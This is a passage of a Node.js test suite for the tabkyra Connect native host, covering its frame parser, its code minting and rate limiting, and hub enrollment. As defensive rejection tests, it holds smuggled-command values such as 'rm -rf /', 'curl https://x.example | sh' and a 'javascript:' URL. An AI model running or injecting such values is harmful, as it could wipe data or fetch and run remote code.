// Settings > Connect, host side. Two layers: the real native host as a process (strict framing,
// nothing on stdout but frames, a bad frame answered and nothing run), and the connect service
// called directly with a stand-in for the user service (so no launchd or systemd unit is made).
// Every config dir is a temp dir; nothing here touches ~/.config/tabkyra.
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, readFileSync, statSync, writeFileSync, mkdirSync } from "node:fs";
import { createServer } from "node:http";
import { join } from "node:path";
import { after, test } from "node:test";
import { cli, machine, rmSync, startHub, tempRoot, writeJson } from "./helpers/hub-fixture.mjs";
import { loadTs } from "./helpers/bundle-ts.mjs";

const root = tempRoot("tabkyra-connect-");
const cleanup = [];
after(() => {
	for (const stop of cleanup) {
		try {
			stop();
		} catch {
			/* already gone */
		}
	}
	rmSync(root, { recursive: true, force: true });
});

const mod = await loadTs(`
export { ConnectService, parseConnect } from "@src/connect-host.ts";
export { setPasscode } from "@src/oauth.ts";
export { themeCss } from "@src/theme.ts";
`);
const { ConnectService, parseConnect, setPasscode, themeCss } = mod;

/** Run `fn` with TABKYRA_CONFIG_DIR pointing at a fresh temp dir (the bundle reads it on every call). */
async function inConfig(name, fn) {
	const dir = join(root, name);
	mkdirSync(dir, { recursive: true, mode: 0o700 });
	const before = process.env.TABKYRA_CONFIG_DIR;
	process.env.TABKYRA_CONFIG_DIR = dir;
	try {
		return await fn(dir);
	} finally {
		if (before === undefined) delete process.env.TABKYRA_CONFIG_DIR;
		else process.env.TABKYRA_CONFIG_DIR = before;
	}
}

/** Send one frame to a service and collect every reply for it. */
async function ask(service, method, params, id = 1) {
	const frames = [];
	await service.handle({ type: "connect", id, method, ...(params === undefined ? {} : { params }) }, (f) => frames.push(f));
	const last = frames.at(-1);
	return { frames, result: last?.result, error: last?.error, progress: frames.filter((f) => f.progress).map((f) => f.progress) };
}

const sha = (v) => createHash("sha256").update(v).digest("hex");
const CODE = /^TK-[0-9A-HJKMNP-TV-Z]{4}-[0-9A-HJKMNP-TV-Z]{4}$/;

// ---------- the parser ----------

test("parser: only exactly {type, id, method, params?} with a known method and that method's params", () => {
	const ok = (m) => parseConnect({ type: "connect", id: 1, ...m });
	assert.deepEqual(ok({ method: "status" }), { ok: true, id: 1, call: { method: "status" } });
	assert.deepEqual(ok({ method: "status", params: {} }).ok, true);
	assert.equal(ok({ method: "setBusy", params: { busy: true } }).call.busy, true);
	assert.deepEqual(ok({ method: "setTheme", params: { preset: "forest", accent: null } }).call, { method: "setTheme", preset: "forest", accent: null });
	assert.deepEqual(ok({ method: "setTheme", params: { preset: "forest" } }).call, { method: "setTheme", preset: "forest" });

	const refused = (message, why) => {
		const r = parseConnect(message);
		assert.equal(r.ok, false, `${why} was accepted`);
		return r;
	};
	// Unknown method, and the names of methods the panel never calls.
	assert.match(refused({ type: "connect", id: 2, method: "nope" }, "unknown method").message, /Unknown method/);
	for (const method of ["__proto__", "constructor", "status ", "STATUS", "link.off", "remote.setup", ""]) refused({ type: "connect", id: 3, method }, `method ${JSON.stringify(method)}`);
	refused({ type: "connect", id: 3, method: 7 }, "numeric method");
	refused({ type: "connect", id: 3 }, "missing method");
	// Frame shape.
	refused({ type: "connect", id: 4, method: "status", extra: 1 }, "an extra field");
	refused({ type: "subscription", id: 4, method: "status" }, "another type");
	refused(null, "null");
	refused("status", "a string");
	refused([], "an array");
	for (const id of [-1, 1.5, "1", null, undefined, Number.NaN, 2 ** 60]) assert.equal(refused({ type: "connect", id, method: "status" }, `id ${id}`).id, undefined);
	assert.equal(refused({ type: "connect", id: 9, method: "nope" }, "unknown").id, 9);
	// params.
	for (const params of [[], "x", 5, null]) refused({ type: "connect", id: 5, method: "status", params }, `params ${JSON.stringify(params)}`);
	refused({ type: "connect", id: 5, method: "status", params: { x: 1 } }, "status params");
	refused({ type: "connect", id: 5, method: "approvalCode", params: { x: 1 } }, "approvalCode params");
	refused({ type: "connect", id: 5, method: "deviceCode", params: { manage: true } }, "deviceCode params (no way to ask for a manager code)");
	refused({ type: "connect", id: 5, method: "setBusy", params: {} }, "setBusy without busy");
	refused({ type: "connect", id: 5, method: "setBusy", params: { busy: "yes" } }, "setBusy string");
	refused({ type: "connect", id: 5, method: "setBusy", params: { busy: true, x: 1 } }, "setBusy extra");
	refused({ type: "connect", id: 5, method: "setTheme", params: { preset: "neon" } }, "unknown preset");
	refused({ type: "connect", id: 5, method: "setTheme", params: { preset: "__proto__" } }, "prototype preset");
	for (const accent of ["red", "#fff", "#12345g", "123456", "#1234567", 5, true]) refused({ type: "connect", id: 5, method: "setTheme", params: { preset: "rose", accent } }, `accent ${accent}`);
});

test("parser: joinHub needs an https origin (http only on loopback), a TK-XXXX-XXXX code and a plain name", () => {
	const join = (params) => parseConnect({ type: "connect", id: 1, method: "joinHub", params });
	const good = join({ hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH", name: "laptop" });
	assert.deepEqual(good.call, { method: "joinHub", hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH", name: "laptop" });
	// A pasted connector URL and a typed lowercase code reduce to the canonical forms.
	assert.deepEqual(join({ hubUrl: " https://hub.example.com/mcp ", code: "tk-abcd-efgh" }).call, { method: "joinHub", hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH" });
	assert.equal(join({ hubUrl: "http://127.0.0.1:8787", code: "TK-ABCD-EFGH" }).ok, true);
	for (const hubUrl of ["http://hub.example.com", "ftp://hub.example.com", "javascript:alert(1)", "https://user:pw@hub.example.com", "https://hub.example.com/path", "https://hub.example.com/?a=1", "https://hub.example.com/#x", "hub.example.com", "", "https://", 5, null, "https://" + "a".repeat(400) + ".com"]) {
		const r = join({ hubUrl, code: "TK-ABCD-EFGH" });
		assert.equal(r.ok, false, `hubUrl ${String(hubUrl).slice(0, 40)} was accepted`);
	}
	for (const code of ["", "TK-ABCD", "TK-ABCD-EFGHI", "ABCD-EFGH", "TK-ABCD-EFG!", "TK-ABCD-EFGH-IJKL", "TK ABCD EFGH EXTRA", "x".repeat(500), 5, null, undefined, "TK-ABCD-EFGH; rm -rf /"]) {
		const r = join({ hubUrl: "https://hub.example.com", code });
		assert.equal(r.ok, false, `code ${String(code).slice(0, 40)} was accepted`);
	}
	for (const name of ["", "a b/c", "x".repeat(41), "-lead", 5, "semi;colon"]) assert.equal(join({ hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH", name }).ok, false, `name ${name} was accepted`);
	assert.equal(join({ hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH", extra: 1 }).ok, false);
});

// ---------- the service, one method at a time ----------

test("a refused frame answers with an error when it has an id, runs nothing, and joinHub never reaches the network", async () => {
	await inConfig("refused", async (dir) => {
		let calls = 0;
		const realFetch = globalThis.fetch;
		globalThis.fetch = async () => {
			calls++;
			throw new Error("no network in this test");
		};
		let installs = 0;
		const service = new ConnectService({ service: { valid: () => true, install: async () => (installs++, { ok: true, message: "stub" }) } });
		try {
			for (const [method, params] of [
				["joinHub", { hubUrl: "http://evil.example.com", code: "TK-ABCD-EFGH" }],
				["joinHub", { hubUrl: "https://hub.example.com", code: "TK-1234" }],
				["joinHub", { hubUrl: "https://hub.example.com/x/y", code: "TK-ABCD-EFGH" }],
				["joinHub", { hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH", name: "bad/name" }],
				["joinHub", { hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH", sneaky: true }],
				["setBusy", { busy: 1 }],
				["setTheme", { preset: "x" }],
				["unknown", {}],
			]) {
				const { error, result } = await ask(service, method, params);
				assert.equal(result, undefined, `${method} returned a result`);
				assert.equal(error?.code, "bad_params", `${method} ${JSON.stringify(params)} gave ${JSON.stringify(error)}`);
			}
			// No id, no answer.
			const frames = [];
			await service.handle({ type: "connect", method: "status" }, (f) => frames.push(f));
			assert.deepEqual(frames, []);
		} finally {
			globalThis.fetch = realFetch;
		}
		assert.equal(calls, 0, "a refused joinHub made a network call");
		assert.equal(installs, 0);
		for (const f of ["link.json", "theme.json", "hub-codes.json", "oauth-codes.json"]) assert.equal(existsSync(join(dir, f)), false, `${f} was written`);
	});
});

test("status: none, remote, hub (with devices) and link, and nothing secret in any of them", async () => {
	await inConfig("status-none", async () => {
		const s = new ConnectService();
		const { result } = await ask(s, "status");
		assert.deepEqual(result, { route: "none", passcodeSet: false, theme: { preset: "tabkyra" } });
	});
	await inConfig("status-remote", async (dir) => {
		const passcode = setPasscode();
		writeJson(join(dir, "remote.json"), { publicUrl: "https://tk.example.com", port: 8787, route: "custom" });
		const { result } = await ask(new ConnectService(), "status");
		assert.deepEqual(result, { route: "remote", publicUrl: "https://tk.example.com", passcodeSet: true, theme: { preset: "tabkyra" } });
		assert.ok(!JSON.stringify(result).includes(passcode));
	});
	await inConfig("status-hub", async (dir) => {
		const passcode = setPasscode();
		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
		const secretHash = sha("device secret");
		writeJson(join(dir, "hub-devices.json"), {
			devices: [
				{ id: "dv-aaaaaaaaaaaa", name: "laptop", sha256: secretHash, manage: true, createdAt: "2026-11-01T00:00:00Z", lastSeen: "2026-11-01T10:00:00Z", version: "1.0.0" },
				{ id: "dv-bbbbbbbbbbbb", name: "desktop", sha256: sha("other"), manage: false, createdAt: "2026-11-01T00:00:00Z" },
			],
			prefer: [],
		});
		writeJson(join(dir, "hub-live.json"), {
			pid: 1,
			updatedAt: Date.now(),
			devices: [{ id: "dv-aaaaaaaaaaaa", name: "laptop", online: true, extensionConnected: true, sessions: 2, busy: true, lastSeen: "2026-11-02T09:00:00Z", version: "1.0.0", browser: null }],
		});
		writeJson(join(dir, "theme.json"), { preset: "forest", accent: "#112233" });
		const { result } = await ask(new ConnectService(), "status");
		assert.equal(result.route, "hub");
		assert.equal(result.publicUrl, "https://hub.example.com");
		assert.deepEqual(result.theme, { preset: "forest", accent: "#112233" });
		assert.deepEqual(result.hub.devices, [
			{ name: "laptop", online: true, extensionConnected: true, sessions: 2, busy: true, lastSeen: "2026-11-02T09:00:00Z" },
			{ name: "desktop", online: false, extensionConnected: false, sessions: 0, busy: false, lastSeen: null },
		]);
		const text = JSON.stringify(result);
		for (const secret of [passcode, secretHash, sha("other"), "dv-aaaaaaaaaaaa"]) assert.ok(!text.includes(secret), `status leaked ${secret}`);
	});
	await inConfig("status-link", async (dir) => {
		writeJson(join(dir, "link.json"), { hubUrl: "https://hub.example.com", deviceId: "dv-cccccccccccc", secret: "S".repeat(43), name: "laptop", manage: true, busy: true });
		writeJson(join(dir, "link-live.json"), { pid: 1, updatedAt: Date.now(), connected: true, lastConnectedAt: null, lastError: null, sessions: 0, extensionConnected: true, busy: true });
		const { result } = await ask(new ConnectService(), "status");
		assert.deepEqual(result, { route: "link", passcodeSet: false, link: { hubUrl: "https://hub.example.com", name: "laptop", online: true, busy: true, manage: true }, theme: { preset: "tabkyra" } });
		assert.ok(!JSON.stringify(result).includes("S".repeat(43)));
		// A stale live file reads offline.
		writeJson(join(dir, "link-live.json"), { pid: 1, updatedAt: Date.now() - 120_000, connected: true, lastConnectedAt: null, lastError: null, sessions: 0, extensionConnected: true, busy: false });
		assert.equal((await ask(new ConnectService(), "status")).result.link.online, false);
	});
	await inConfig("status-broken", async (dir) => {
		writeFileSync(join(dir, "remote.json"), "{not json");
		const { result } = await ask(new ConnectService(), "status");
		assert.equal(result.route, "none");
		assert.match(result.problem, /remote\.json/);
	});
	// A corrupt hub-devices.json is a problem to show; the route stays hub and the other calls keep working.
	await inConfig("status-broken-devices", async (dir) => {
		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
		writeFileSync(join(dir, "hub-devices.json"), "{not json");
		const s = new ConnectService();
		const { result, error } = await ask(s, "status");
		assert.equal(error, undefined, "status failed outright");
		assert.equal(result.route, "hub");
		assert.equal(result.publicUrl, "https://hub.example.com");
		assert.match(result.problem, /hub-devices\.json/);
		assert.equal(result.hub, undefined);
		// The calls that read status first still work.
		assert.match((await ask(s, "approvalCode", undefined, 2)).result?.code ?? "", CODE);
	});
});

test("approvalCode and deviceCode: minted on the hub machine, stored as hashes, refused without a route", async () => {
	await inConfig("codes-none", async () => {
		const s = new ConnectService();
		for (const method of ["approvalCode", "deviceCode"]) {
			const { error } = await ask(s, method);
			assert.equal(error.code, "unavailable");
			assert.match(error.message, /no public address/);
		}
	});
	await inConfig("codes-remote", async (dir) => {
		writeJson(join(dir, "remote.json"), { publicUrl: "https://tk.example.com", port: 8787, route: "custom" });
		const s = new ConnectService();
		const { result } = await ask(s, "approvalCode");
		assert.match(result.code, CODE);
		assert.equal(result.connectorUrl, "https://tk.example.com/mcp");
		assert.ok(result.expiresAt > Date.now() + 9 * 60_000 && result.expiresAt <= Date.now() + 10 * 60_000 + 1000);
		const stored = readFileSync(join(dir, "oauth-codes.json"), "utf8");
		assert.ok(stored.includes(sha(result.code)) && !stored.includes(result.code), "the code is stored only as a hash");
		// A remote route has no devices behind it.
		assert.match((await ask(s, "deviceCode")).error.message, /hub setup/);
	});
	await inConfig("codes-hub", async (dir) => {
		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
		const s = new ConnectService();
		const approval = (await ask(s, "approvalCode")).result;
		assert.equal(approval.connectorUrl, "https://hub.example.com/mcp");
		const device = (await ask(s, "deviceCode")).result;
		assert.match(device.code, CODE);
		assert.equal(device.hubUrl, "https://hub.example.com");
		const stored = readFileSync(join(dir, "hub-codes.json"), "utf8");
		assert.ok(stored.includes(sha(device.code)) && !stored.includes(device.code));
		assert.match(stored, /"manage": false/);
	});
});

/** A stand-in hub for /link/code, counting what it was asked. */
async function fakeHub(manage) {
	const asked = [];
	const server = createServer((req, res) => {
		let body = "";
		req.on("data", (d) => (body += d));
		req.on("end", () => {
			asked.push({ path: req.url, auth: req.headers.authorization, body: JSON.parse(body || "{}") });
			res.setHeader("content-type", "application/json");
			if (!manage) {
				res.statusCode = 403;
				return res.end(JSON.stringify({ error: "forbidden", error_description: "This device is not a manager." }));
			}
			const kind = JSON.parse(body).kind;
			res.end(JSON.stringify(kind === "approval" ? { kind, code: "TK-AAAA-BBBB", expiresAt: Date.now() + 600_000, url: "https://hub.example.com/mcp" } : { kind, code: "TK-CCCC-DDDD", expiresAt: Date.now() + 600_000 }));
		});
	});
	await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
	cleanup.push(() => server.close());
	return { asked, url: `http://127.0.0.1:${server.address().port}` };
}

test("approvalCode and deviceCode on a linked device go through the hub, and only a manager may", async () => {
	const hub = await fakeHub(true);
	await inConfig("codes-link-manager", async (dir) => {
		writeJson(join(dir, "link.json"), { hubUrl: hub.url, deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: true });
		const s = new ConnectService();
		const approval = (await ask(s, "approvalCode")).result;
		assert.deepEqual(approval.code, "TK-AAAA-BBBB");
		assert.equal(approval.connectorUrl, "https://hub.example.com/mcp");
		const device = (await ask(s, "deviceCode")).result;
		assert.deepEqual({ code: device.code, hubUrl: device.hubUrl }, { code: "TK-CCCC-DDDD", hubUrl: hub.url });
		assert.deepEqual(hub.asked.map((a) => a.body), [{ kind: "approval", manage: false }, { kind: "connect", manage: false }]);
		assert.equal(hub.asked[0].auth, `Bearer dv-dddddddddddd.${"Z".repeat(43)}`);
	});
	await inConfig("codes-link-plain", async (dir) => {
		writeJson(join(dir, "link.json"), { hubUrl: hub.url, deviceId: "dv-eeeeeeeeeeee", secret: "Y".repeat(43), name: "plain", manage: false });
		const before = hub.asked.length;
		const s = new ConnectService();
		for (const method of ["approvalCode", "deviceCode"]) {
			const { error, result } = await ask(s, method);
			assert.equal(result, undefined);
			assert.equal(error.code, "unavailable");
			assert.match(error.message, /isn't a manager/);
		}
		assert.equal(hub.asked.length, before, "a non-manager device asked the hub for a code");
	});
});

test("codes are limited to 10 per 10 minutes, across both kinds, and the 11th mints nothing", async () => {
	await inConfig("limit", async (dir) => {
		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
		let now = 1_800_000_000_000;
		const s = new ConnectService({ now: () => now });
		// The stored codes are live at the real clock, so use real time for expiry but the injected clock for the window.
		const codes = [];
		for (let i = 0; i < 10; i++) {
			const r = await ask(s, i % 2 ? "deviceCode" : "approvalCode", undefined, i + 1);
			assert.ok(r.result, `call ${i + 1}: ${JSON.stringify(r.error)}`);
			codes.push(r.result.code);
			now += 1000;
		}
		const eleventh = await ask(s, "approvalCode", undefined, 11);
		assert.equal(eleventh.result, undefined);
		assert.equal(eleventh.error.code, "rate_limited");
		assert.match(eleventh.error.message, /10 codes in ten minutes/);
		const approvals = JSON.parse(readFileSync(join(dir, "oauth-codes.json"), "utf8")).codes.length;
		const connects = JSON.parse(readFileSync(join(dir, "hub-codes.json"), "utf8")).codes.length;
		assert.equal(approvals + connects, 10, "the refused call still minted a code");
		// Status is not limited, and the window slides.
		assert.ok((await ask(s, "status")).result);
		now += 10 * 60_000;
		assert.ok((await ask(s, "deviceCode", undefined, 12)).result);
	});
});

test("setBusy writes the busy mark on a linked device and is refused anywhere else", async () => {
	await inConfig("busy-none", async (dir) => {
		const { error } = await ask(new ConnectService(), "setBusy", { busy: true });
		assert.equal(error.code, "unavailable");
		assert.equal(existsSync(join(dir, "link.json")), false);
	});
	await inConfig("busy-link", async (dir) => {
		writeJson(join(dir, "link.json"), { hubUrl: "https://hub.example.com", deviceId: "dv-ffffffffffff", secret: "W".repeat(43), name: "laptop", manage: false });
		const s = new ConnectService();
		assert.deepEqual((await ask(s, "setBusy", { busy: true })).result, { busy: true });
		assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).busy, true);
		assert.equal((await ask(s, "status")).result.link.busy, true);
		await ask(s, "setBusy", { busy: false });
		const after = JSON.parse(readFileSync(join(dir, "link.json"), "utf8"));
		assert.equal(Object.hasOwn(after, "busy"), false);
		assert.equal(after.secret, "W".repeat(43), "the rest of link.json is kept");
	});
	await inConfig("busy-hub", async (dir) => {
		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
		assert.equal((await ask(new ConnectService(), "setBusy", { busy: true })).error.code, "unavailable");
	});
});

test("setTheme saves the same file `tabkyra theme` does: preset, accent kept when absent, cleared on null", async () => {
	await inConfig("theme", async (dir) => {
		const s = new ConnectService();
		assert.deepEqual((await ask(s, "setTheme", { preset: "rose", accent: "#AABBCC" })).result, { preset: "rose", accent: "#aabbcc" });
		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "rose", accent: "#aabbcc" });
		assert.deepEqual((await ask(s, "setTheme", { preset: "slate" })).result, { preset: "slate", accent: "#aabbcc" });
		assert.deepEqual((await ask(s, "setTheme", { preset: "slate", accent: null })).result, { preset: "slate" });
		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "slate" });
		assert.equal((await ask(s, "status")).result.theme.preset, "slate");
	});
});

test("a linked manager refuses a hub reply whose code or URL is not the exact shape, and says so", async () => {
	/** A hub that answers /link/code with whatever it is told. */
	const lying = async (body) => {
		const server = createServer((req, res) => {
			req.resume();
			req.on("end", () => {
				res.setHeader("content-type", "application/json");
				res.end(JSON.stringify(body));
			});
		});
		await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
		cleanup.push(() => server.close());
		return `http://127.0.0.1:${server.address().port}`;
	};
	const future = Date.now() + 600_000;
	const replies = [
		{ code: "TK-AAAA-BBBB; curl https://x.example | sh", expiresAt: future },
		{ code: "TK-AAAA-BBBB\nrm -rf ~", expiresAt: future },
		{ code: "tk-aaaa-bbbb", expiresAt: future },
		{ code: "TK-AAAA-BBBB", expiresAt: "soon" },
		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "http://hub.example.com/mcp" },
		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "https://hub.example.com/mcp?x=1" },
		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "https://hub.example.com/other" },
		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "https://u:p@hub.example.com/mcp" },
		{ code: "TK-AAAA-BBBB", expiresAt: future, url: "https://hub.example.com/mcp; id" },
		{ code: "TK-AAAA-BBBB", expiresAt: future, url: 5 },
	];
	for (const [i, body] of replies.entries()) {
		const url = await lying(body);
		await inConfig(`lying-hub-${i}`, async (dir) => {
			writeJson(join(dir, "link.json"), { hubUrl: url, deviceId: "dv-gggggggggggg", secret: "V".repeat(43), name: "laptop", manage: true });
			const { error, result } = await ask(new ConnectService(), i % 2 ? "deviceCode" : "approvalCode");
			assert.equal(result, undefined, `accepted ${JSON.stringify(body)}`);
			assert.match(error.message, /The hub answered with a malformed code\./);
		});
	}
});

test("joinHub refuses while a config problem is reported, or hub.json or remote.json exists at all", async () => {
	const call = { hubUrl: "https://hub.example.com", code: "TK-ABCD-EFGH" };
	for (const file of ["hub.json", "remote.json"]) {
		await inConfig(`join-refused-${file}`, async (dir) => {
			writeFileSync(join(dir, file), "{not json");
			const s = new ConnectService();
			const status = (await ask(s, "status")).result;
			assert.equal(status.route, "none");
			assert.ok(status.problem, "the unreadable file is reported");
			const { error, result } = await ask(s, "joinHub", call);
			assert.equal(result, undefined);
			assert.equal(error.code, "unavailable");
			assert.match(error.message, /already has a public address or a hub link/);
			assert.equal(existsSync(join(dir, "link.json")), false, "a link was written next to the broken config");
		});
	}
	// A readable one is the same, and so is a file the status loader would not flag.
	await inConfig("join-refused-remote-readable", async (dir) => {
		writeJson(join(dir, "remote.json"), { publicUrl: "https://tk.example.com", port: 8787, route: "custom" });
		assert.equal((await ask(new ConnectService(), "joinHub", call)).error.code, "unavailable");
	});
});

test("the code limit is kept in a private file, so a new host process does not reset it", async () => {
	await inConfig("limit-persist", async (dir) => {
		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
		const now = Date.now();
		const first = new ConnectService({ now: () => now });
		for (let i = 0; i < 10; i++) assert.ok((await ask(first, "deviceCode", undefined, i + 1)).result, `call ${i + 1}`);
		const file = join(dir, "connect-mints.json");
		assert.equal(statSync(file).mode & 0o777, 0o600);
		assert.equal(JSON.parse(readFileSync(file, "utf8")).minted.length, 10);
		assert.ok(!readFileSync(file, "utf8").includes("TK-"), "the file holds timestamps only");
		// A second process (a fresh service) starts with the same count.
		const second = new ConnectService({ now: () => now + 1000 });
		const refused = await ask(second, "approvalCode", undefined, 11);
		assert.equal(refused.error.code, "rate_limited");
		// Once the window has passed it mints again.
		const later = new ConnectService({ now: () => now + 10 * 60_000 + 1 });
		assert.ok((await ask(later, "approvalCode", undefined, 12)).result);
		assert.equal(JSON.parse(readFileSync(file, "utf8")).minted.length, 1);
	});
	// An unreadable file counts as empty rather than blocking Connect.
	await inConfig("limit-corrupt", async (dir) => {
		writeJson(join(dir, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
		writeFileSync(join(dir, "connect-mints.json"), "{not json");
		assert.ok((await ask(new ConnectService(), "deviceCode")).result);
	});
});

test("setTheme with a mode stores it in theme.json, keeps it when absent, clears it on system, and refuses anything else", async () => {
	await inConfig("theme-mode", async (dir) => {
		const s = new ConnectService();
		assert.deepEqual((await ask(s, "setTheme", { preset: "rose", accent: null, mode: "dark" })).result, { preset: "rose", mode: "dark" });
		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "rose", mode: "dark" });
		assert.deepEqual((await ask(s, "status")).result.theme, { preset: "rose", mode: "dark" });
		// Absent keeps it.
		assert.deepEqual((await ask(s, "setTheme", { preset: "slate" })).result, { preset: "slate", mode: "dark" });
		assert.deepEqual((await ask(s, "setTheme", { preset: "slate", mode: "light" })).result, { preset: "slate", mode: "light" });
		// "system" clears it: no mode key at all.
		assert.deepEqual((await ask(s, "setTheme", { preset: "slate", mode: "system" })).result, { preset: "slate" });
		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "slate" });
		for (const mode of ["DARK", "auto", "", 1, null, ["dark"], "dark; x"]) {
			const { error, result } = await ask(s, "setTheme", { preset: "slate", mode });
			assert.equal(result, undefined, `accepted mode ${JSON.stringify(mode)}`);
			assert.equal(error.code, "bad_params");
		}
		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "slate" });
		// `tabkyra theme set` and `accent` keep a mode already chosen.
		await ask(s, "setTheme", { preset: "slate", mode: "dark" });
		const m = { ...process.env, TABKYRA_CONFIG_DIR: dir };
		const theme = (...args) => spawnSync(process.execPath, [cli, "theme", ...args], { env: m, encoding: "utf8" }).status;
		assert.equal(theme("set", "forest"), 0);
		assert.equal(theme("accent", "#112233"), 0);
		assert.deepEqual(JSON.parse(readFileSync(join(dir, "theme.json"), "utf8")), { preset: "forest", accent: "#112233", mode: "dark" });
	});
});

test("the page theme pins color-scheme for a fixed mode and follows the system otherwise", () => {
	const system = themeCss({ preset: "forest" });
	assert.match(system, /color-scheme:light dark/);
	assert.match(system, /@media \(prefers-color-scheme:dark\)/);
	for (const mode of ["light", "dark"]) {
		const css = themeCss({ preset: "forest", mode });
		assert.match(css, new RegExp(`^:root\\{color-scheme:${mode};`));
		assert.doesNotMatch(css, /prefers-color-scheme/);
	}
	assert.notEqual(themeCss({ preset: "forest", mode: "light" }), themeCss({ preset: "forest", mode: "dark" }));
});

// ---------- joinHub against a real hub ----------

test("joinHub enrolls this device on a real hub, reports progress, keeps secrets out of the reply, and a code works once", async () => {
	const hub = await startHub(root, "join-hub");
	cleanup.push(() => hub.stop());
	const code = hub.json(["hub", "code", "--name", "joined", "--json"]).code;
	await inConfig("join-ok", async (dir) => {
		const steps = [];
		const service = new ConnectService({
			service: {
				valid: () => true,
				install: async () => {
					steps.push("install");
					return { ok: true, message: "stub service installed" };
				},
			},
		});
		const { result, error, progress } = await ask(service, "joinHub", { hubUrl: `${hub.url}/mcp`, code: code.toLowerCase() });
		assert.equal(error, undefined, JSON.stringify(error));
		assert.deepEqual(result, { name: "joined", manage: false });
		assert.deepEqual(progress, [{ step: "contacting" }, { step: "service" }]);
		assert.deepEqual(steps, ["install"]);
		const link = JSON.parse(readFileSync(join(dir, "link.json"), "utf8"));
		assert.equal(link.hubUrl, hub.url);
		assert.equal(link.name, "joined");
		assert.ok(link.secret.length >= 40);
		const everything = JSON.stringify({ result, progress });
		assert.ok(!everything.includes(link.secret) && !everything.includes(link.deviceId) && !everything.includes(code));
		assert.equal((await ask(service, "status")).result.route, "link");
		// Already linked: refused, and the hub is not asked.
		const second = await ask(service, "joinHub", { hubUrl: hub.url, code });
		assert.equal(second.error.code, "unavailable");
	});
	// The same code again, from another machine: the hub refuses it.
	await inConfig("join-reuse", async (dir) => {
		const service = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: true, message: "stub" }) } });
		const { error } = await ask(service, "joinHub", { hubUrl: hub.url, code });
		assert.equal(error.code, "failed");
		assert.match(error.message, /wrong, expired or already used/);
		assert.equal(existsSync(join(dir, "link.json")), false);
	});
});

test("joinHub: a service that won't start is an error that says the device is linked; no launcher stops before the network", async () => {
	const hub = await startHub(root, "join-hub-2");
	cleanup.push(() => hub.stop());
	await inConfig("join-service-fails", async (dir) => {
		const code = hub.json(["hub", "code", "--name", "svc", "--json"]).code;
		const service = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: false, message: "launchctl bootstrap failed" }) } });
		const { error } = await ask(service, "joinHub", { hubUrl: hub.url, code });
		assert.equal(error.code, "failed");
		assert.match(error.message, /Linked as svc, but the background service didn't start/);
		assert.equal(existsSync(join(dir, "link.json")), true);
	});
	await inConfig("join-no-launcher", async (dir) => {
		const code = hub.json(["hub", "code", "--name", "nolauncher", "--json"]).code;
		const service = new ConnectService({ service: { valid: () => false, install: async () => ({ ok: true, message: "never" }) } });
		const { error } = await ask(service, "joinHub", { hubUrl: hub.url, code });
		assert.match(error.message, /isn't a working launcher/);
		assert.equal(existsSync(join(dir, "link.json")), false);
		// The code was not spent: the hub still accepts it.
		const retry = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: true, message: "stub" }) } });
		assert.equal((await ask(retry, "joinHub", { hubUrl: hub.url, code })).result.name, "nolauncher");
	});
});

test("joinHub: an unreachable hub is a plain error and writes nothing", async () => {
	await inConfig("join-unreachable", async (dir) => {
		const service = new ConnectService({ service: { valid: () => true, install: async () => ({ ok: true, message: "stub" }) } });
		const { error } = await ask(service, "joinHub", { hubUrl: "http://127.0.0.1:1", code: "TK-ABCD-EFGH" });
		assert.equal(error.code, "failed");
		assert.match(error.message, /Couldn't reach http:\/\/127\.0\.0\.1:1/);
		assert.equal(existsSync(join(dir, "link.json")), false);
	});
});

// ---------- the real native host ----------

const frame = (m) => {
	const body = Buffer.from(JSON.stringify(m));
	const head = Buffer.alloc(4);
	head.writeUInt32LE(body.length);
	return Buffer.concat([head, body]);
};

/** `tabkyra host` as a process: write frames to its stdin, read frames from its stdout. */
function startHost(name) {
	const m = machine(root, name);
	const proc = spawn(process.execPath, [cli, "host"], { env: m.env, stdio: ["pipe", "pipe", "pipe"] });
	let buf = Buffer.alloc(0);
	let garbage = false;
	const frames = [];
	const waiting = [];
	proc.stdout.on("data", (chunk) => {
		buf = Buffer.concat([buf, chunk]);
		while (buf.length >= 4 && buf.length >= 4 + buf.readUInt32LE(0)) {
			const len = buf.readUInt32LE(0);
			try {
				frames.push(JSON.parse(buf.subarray(4, 4 + len).toString()));
			} catch {
				garbage = true;
			}
			buf = buf.subarray(4 + len);
		}
		for (const w of [...waiting]) w();
	});
	let stderr = "";
	proc.stderr.on("data", (d) => (stderr += d));
	cleanup.push(() => proc.kill());
	return {
		m,
		proc,
		frames,
		stderr: () => stderr,
		garbage: () => garbage,
